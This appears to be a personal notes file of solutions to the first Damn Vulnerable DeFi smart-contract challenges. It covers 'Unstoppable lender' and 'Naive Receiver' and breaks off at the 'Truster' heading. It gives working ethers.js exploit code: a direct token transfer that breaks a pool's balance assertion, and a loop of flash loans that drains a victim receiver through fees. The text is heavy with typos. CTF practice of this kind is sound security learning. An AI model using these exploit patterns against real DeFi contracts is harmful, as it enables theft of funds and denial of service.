SOLUTIONS: 


#1- unstoppable lender:

 - simply transfer the tokens manually from the attacker to the lending pool with 
        await this.token.approve(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        because the lending pool keeps track of the amount poolBalance and updates it only when tokens are deposiited via depositTokens() function, doing it manually will break the assertion 
         assert(poolBalance == balanceBefore);



         #2 Naive Reciever- 
            in the lending pool contract, the flashlona function does not require that the borrower be the person who called the function. So we just call the flashLan function 10 times with the user's flashloanReceiver contract as the borrower. this will take 1 eth fee each time until the account is drained 

            for(let i = 0;i<10;i++){
                await this.pool.flashLoan(this.receiver.address,ethers.utils.parseEther('1'))
            }
        
        to do it in a single tx, coulddeploy a smart contract which usess a while loop to keep draining until userbalance < fee

        #3) Truster